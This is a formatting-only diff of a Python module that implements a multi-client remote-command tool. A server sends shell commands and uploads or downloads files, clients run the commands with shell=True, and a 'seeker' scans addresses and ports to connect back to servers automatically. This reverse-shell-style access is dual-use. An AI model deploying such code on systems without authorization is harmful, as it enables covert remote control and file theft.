@@ -16,14 +16,16 @@ from rich import print
 from lash.plugins.spider.helpers import send_msg, recv_msg
 
 
-# ── web ───────────────────────────────────────────────────────────────────────
+# ── web ─────────────────────────────────────────────────────────────────
 
 
 def port_verify(port: str) -> int:
     try:
         return int(port)
     except ValueError:
-        raise ValueError(f"Invalid port [{port}], must be an integer like 8080")
+        raise ValueError(
+            f"Invalid port [{port}], must be an integer like 8080"
+        )
 
 
 def run_server(host: str, port: int) -> None:  # noqa: C901
@@ -50,18 +52,32 @@ def run_server(host: str, port: int) -> None:  # noqa: C901
                             active[0] = addr
                     registered = True
                     if is_first:
-                        events.put({"type": "connected", "addr": addr, "path": path})
+                        events.put(
+                            {"type": "connected", "addr": addr, "path": path})
                     else:
-                        print(f"[yellow][new connection][/yellow] {addr} ({path})")
+                        print(
+                            f"[yellow][new connection][/yellow] {addr} ({path})")
                 elif mtype == "result" and registered:
                     path = msg.get("path", client_paths.get(addr, ""))
                     with lock:
                         client_paths[addr] = path
                     if active[0] == addr:
-                        events.put({"type": "result", "data": msg.get("data", ""), "path": path})
+                        events.put(
+                            {
+                                "type": "result",
+                                "data": msg.get("data", ""),
+                                "path": path,
+                            }
+                        )
                 elif mtype == "file" and registered:
                     if active[0] == addr:
-                        events.put({"type": "file", "filename": msg.get("filename", ""), "data": msg.get("data", "")})
+                        events.put(
+                            {
+                                "type": "file",
+                                "filename": msg.get("filename", ""),
+                                "data": msg.get("data", ""),
+                            }
+                        )
         except (ConnectionError, OSError):
             pass
         finally:
@@ -82,7 +98,10 @@ def run_server(host: str, port: int) -> None:  # noqa: C901
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind((host, port))
         s.listen()
-        print(f"[green]Server online[/green] [{host}:{port}] — waiting for first connection...")
+        print(
+            f"[green]Server online[/green] [{host}:{port}] — "
+            "waiting for first connection..."
+        )
 
         def accept_loop() -> None:
             while True:
@@ -90,7 +109,9 @@ def run_server(host: str, port: int) -> None:  # noqa: C901
                     conn, (ip, p) = s.accept()
                     addr = f"{ip}:{p}"
                     send_msg(conn, welcome)
-                    threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
+                    threading.Thread(
+                        target=handle_client, args=(
+                            conn, addr), daemon=True).start()
                 except OSError:
                     break
 
@@ -131,13 +152,20 @@ def run_server(host: str, port: int) -> None:  # noqa: C901
             if command == "@help":
                 print(
                     "[bold]Internal commands:[/bold]\n"
-                    "  [cyan]@help[/cyan]                       Show this help guide\n"
-                    "  [cyan]@list-clients[/cyan]               List all connected clients\n"
-                    "  [cyan]@client-conn <ip:port>[/cyan]      Switch active client\n"
-                    "  [cyan]@up <path>[/cyan]                  Upload file to client CWD (path relative to server)\n"
-                    "  [cyan]@down <path>[/cyan]                Download file from client CWD (path relative to client)\n"
-                    "  [cyan]kill[/cyan]                        Disconnect and stop server\n"
-                    "  [dim]<any other input>[/dim]             Send shell command to active client"
+                    "  [cyan]@help[/cyan]                       "
+                    "Show this help guide\n"
+                    "  [cyan]@list-clients[/cyan]               "
+                    "List all connected clients\n"
+                    "  [cyan]@client-conn <ip:port>[/cyan]      "
+                    "Switch active client\n"
+                    "  [cyan]@up <path>[/cyan]                  "
+                    "Upload file to client CWD (path relative to server)\n"
+                    "  [cyan]@down <path>[/cyan]                "
+                    "Download file from client CWD (path relative to client)\n"
+                    "  [cyan]kill[/cyan]                        "
+                    "Disconnect and stop server\n"
+                    "  [dim]<any other input>[/dim]             "
+                    "Send shell command to active client"
                 )
                 continue
 
@@ -185,7 +213,10 @@ def run_server(host: str, port: int) -> None:  # noqa: C901
                     print("[red]No active client[/red]")
                     continue
                 try:
-                    send_msg(conn, {"type": "upload", "filename": filepath.name, "data": base64.b64encode(raw).decode()})
+                    send_msg(conn,
+                             {"type": "upload",
+                              "filename": filepath.name,
+                              "data": base64.b64encode(raw).decode()})
                 except OSError:
                     continue
                 while True:
@@ -196,7 +227,8 @@ def run_server(host: str, port: int) -> None:  # noqa: C901
                                 print(ev["data"], end="", flush=True)
                             break
                         elif ev["type"] == "connected":
-                            print(f"\n[yellow][new connection][/yellow] {ev['addr']}")
+                            print(
+                                f"\n[yellow][new connection][/yellow] {ev['addr']}")
                         elif ev["type"] == "disconnected":
                             print("\n[red][active client disconnected][/red]")
                             break
@@ -216,7 +248,10 @@ def run_server(host: str, port: int) -> None:  # noqa: C901
                     print("[red]No active client[/red]")
                     continue
                 try:
-                    send_msg(conn, {"type": "download", "path": parts[1].strip()})
+                    send_msg(
+                        conn,
+                        {"type": "download", "path": parts[1].strip()},
+                    )
                 except OSError:
                     continue
                 while True:
@@ -226,14 +261,16 @@ def run_server(host: str, port: int) -> None:  # noqa: C901
                             fname = ev["filename"]
                             dest = Path(os.getcwd()) / fname
                             dest.write_bytes(base64.b64decode(ev["data"]))
-                            print(f"[green]Downloaded {fname} → {dest}[/green]")
+                            print(
+                                f"[green]Downloaded {fname} → {dest}[/green]")
                             break
                         elif ev["type"] == "result":
                             if ev["data"]:
                                 print(ev["data"], end="", flush=True)
                             break
                         elif ev["type"] == "connected":
-                            print(f"\n[yellow][new connection][/yellow] {ev['addr']}")
+                            print(
+                                f"\n[yellow][new connection][/yellow] {ev['addr']}")
                         elif ev["type"] == "disconnected":
                             print("\n[red][active client disconnected][/red]")
                             break
@@ -265,7 +302,8 @@ def run_server(host: str, port: int) -> None:  # noqa: C901
                             print(ev["data"], end="", flush=True)
                         break
                     elif ev["type"] == "connected":
-                        print(f"\n[yellow][new connection][/yellow] {ev['addr']}")
+                        print(
+                            f"\n[yellow][new connection][/yellow] {ev['addr']}")
                     elif ev["type"] == "disconnected":
                         print("\n[red][active client disconnected][/red]")
                         break
@@ -291,15 +329,35 @@ def run_web_client(host: str, port: int) -> None:  # noqa: C901
             mtype = msg.get("type")
             if mtype == "upload":
                 filename = msg.get("filename", "file")
-                (Path(cwd) / filename).write_bytes(base64.b64decode(msg["data"]))
-                send_msg(s, {"type": "result", "data": f"Uploaded {filename}\n", "path": cwd, "addr": local_ip})
+                (Path(cwd) /
+                 filename).write_bytes(base64.b64decode(msg["data"]))
+                send_msg(s,
+                         {"type": "result",
+                          "data": f"Uploaded {filename}\n",
+                             "path": cwd,
+                             "addr": local_ip})
                 continue
             if mtype == "download":
                 try:
                     src = Path(cwd) / msg.get("path", "")
-                    send_msg(s, {"type": "file", "filename": src.name, "data": base64.b64encode(src.read_bytes()).decode()})
+                    send_msg(
+                        s,
+                        {
+                            "type": "file",
+                            "filename": src.name,
+                            "data": base64.b64encode(src.read_bytes()).decode(),
+                        },
+                    )
                 except OSError as e:
-                    send_msg(s, {"type": "result", "data": f"Error: {e}\n", "path": cwd, "addr": local_ip})
+                    send_msg(
+                        s,
+                        {
+                            "type": "result",
+                            "data": f"Error: {e}\n",
+                            "path": cwd,
+                            "addr": local_ip,
+                        },
+                    )
                 continue
             if mtype != "cmd":
                 continue
@@ -315,13 +373,17 @@ def run_web_client(host: str, port: int) -> None:  # noqa: C901
                     output = f"{e}\n"
             else:
                 result = subprocess.run(
-                    command, shell=True, capture_output=True, text=True, cwd=cwd
-                )
+                    command,
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    cwd=cwd)
                 output = result.stdout + result.stderr
-            send_msg(s, {"type": "result", "data": output, "path": cwd, "addr": local_ip})
+            send_msg(s, {"type": "result", "data": output,
+                     "path": cwd, "addr": local_ip})
 
 
-# ── seeker ────────────────────────────────────────────────────────────────────
+# ── seeker ──────────────────────────────────────────────────────────────
 
 
 def seeker_pid_path() -> Path:
@@ -356,7 +418,10 @@ def is_pid_alive(pid: int) -> bool:
         return False
 
 
-def seeker_scan_loop(addresses: list[str], ports: list[int], ping_interval: int) -> None:
+def seeker_scan_loop(
+        addresses: list[str],
+        ports: list[int],
+        ping_interval: int) -> None:
     connected_servers: set[tuple[str, int]] = set()
     while True:
         _scan_once(addresses, ports, connected_servers)
@@ -399,7 +464,15 @@ def _scan_once(
 
 
 def _spawn_client(server_cmd: str, ip: str, port: int) -> None:
-    argv = [sys.executable, "-m", "lash", "spider", server_cmd, "-c", ip, str(port)]
+    argv = [
+        sys.executable,
+        "-m",
+        "lash",
+        "spider",
+        server_cmd,
+        "-c",
+        ip,
+        str(port)]
     if sys.platform == "win32":
         subprocess.Popen(
             argv,
